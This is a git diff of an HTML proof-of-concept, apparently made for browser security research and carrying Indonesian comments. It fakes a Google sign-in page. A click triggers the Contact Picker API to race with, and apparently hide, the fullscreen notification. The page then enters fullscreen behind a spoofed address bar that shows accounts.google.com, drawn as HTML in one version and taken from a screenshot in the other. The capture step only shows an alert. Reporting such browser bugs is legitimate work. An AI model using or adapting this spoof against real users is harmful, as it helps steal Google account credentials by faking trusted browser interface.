@@ -1,85 +1,125 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>Security UI Spoof - Research</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                overflow: hidden;
-            }         
-            #content {
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                background-color: #f0f2f5;
-                cursor: pointer;
-            }
-            /* Konten Fake Login */
-            #fake-login {
-                display: none;
-                width: 100%;
-                height: 100%;
-                background: white;
-            }
-        </style>
-    </head>  
-    <body>
-        <div id="content">
-            <div style="text-align: center;">
-                <h1>Click anywhere to continue</h1>
-                <p>Security Research PoC</p>
-            </div>
-        </div>
+<head>
+    <title>Security UI Research</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+        
+        /* Layar pemicu */
+        #trigger-zone {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #fff;
+            cursor: pointer;
+        }
 
-        <div id="fake-login">
-            <div style="background: #f1f3f4; padding: 8px; border-bottom: 1px solid #ccc; display: flex;">
-                <div style="background: white; border-radius: 20px; padding: 5px 20px; width: 60%; margin: 0 auto; color: #5f6368; font-size: 13px; border: 1px solid #dfe1e5; display: flex; align-items: center;">
-                    <span style="color: green; margin-right: 8px;">🔒</span> accounts.google.com/signin/v2/identifier
+        /* Container utama setelah fullscreen */
+        #spoof-container {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            flex-direction: column;
+        }
+
+        /* Bagian Omnibox Palsu menggunakan gambar Anda */
+        #fake-omnibox {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        /* Area Form Login */
+        #login-frame {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+            background: #ffffff;
+        }
+
+        .login-box {
+            width: 350px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 13px;
+            margin: 20px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .btn-next {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            float: right;
+            font-weight: 500;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="trigger-zone">
+        <div style="text-align: center;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100">
+            <h2 style="color: #5f6368;">Sign in to continue</h2>
+            <button style="padding: 10px 20px; border: 1px solid #dadce0; background: white; border-radius: 4px;">Click to Login</button>
+        </div>
+    </div>
+
+    <div id="spoof-container">
+        <img id="fake-omnibox" src="spoof.jpeg" alt="Browser UI">
+
+        <div id="login-frame">
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+                <h1 style="font-size: 24px; margin-top: 10px;">Sign in</h1>
+                <p>Use your Google Account</p>
+                
+                <input type="email" placeholder="Email or phone" id="fake_email">
+                
+                <div style="width: 100%; margin-top: 30px;">
+                    <span style="color: #1a73e8; font-weight: 500; float: left; margin-top: 10px; cursor: pointer;">Forgot email?</span>
+                    <button class="btn-next" onclick="alert('Data Captured: ' + document.getElementById('fake_email').value)">Next</button>
                 </div>
             </div>
-
-            <div style="display: flex; justify-content: center; align-items: center; height: 80vh;">
-                <div style="width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center;">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
-                    <h2>Sign in</h2>
-                    <p>Use your Google Account</p>
-                    <input type="text" placeholder="Email or phone" style="width: 100%; padding: 12px; margin-top: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
-                        <span style="color: #1a73e8; font-weight: bold; cursor: pointer;">Create account</span>
-                        <button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold;">Next</button>
-                    </div>
-                </div>
-            </div>
         </div>
+    </div>
 
-        <script>
-            window.onclick = async () => {
-                // BUG UTAMA: Memicu pemilih kontak untuk mengalihkan fokus UI browser
-                (async () => {
-                    try {
-                        // Dialog ini akan muncul dan berpotensi menutupi notifikasi fullscreen
-                        await navigator.contacts.select(["name"], { multiple: false });
-                    } catch (e) {
-                        console.log("Contacts API dismissed");
-                    }
-                })();
-
-                // Transisi ke Fullscreen
+    <script>
+        document.getElementById('trigger-zone').onclick = async () => {
+            // 1. Race Condition: Trigger Contact Picker
+            (async () => {
                 try {
-                    await document.documentElement.requestFullscreen();
-                    
-                    // Sembunyikan instruksi awal, tampilkan fake login
-                    document.getElementById("content").style.display = "none";
-                    document.getElementById("fake-login").style.display = "block";
-                } catch (err) {
-                    console.error("Fullscreen failed", err);
-                }
+                    await navigator.contacts.select(['name'], {multiple: false});
+                } catch(e) {}
+            })();
+
+            // 2. Masuk Fullscreen
+            try {
+                await document.documentElement.requestFullscreen();
+                
+                // Ganti UI ke mode spoofing
+                document.getElementById('trigger-zone').style.display = 'none';
+                document.getElementById('spoof-container').style.display = 'flex';
+            } catch (err) {
+                console.error(err);
             }
-        </script>
-    </body>
+        };
+    </script>
+</body>
 </html>
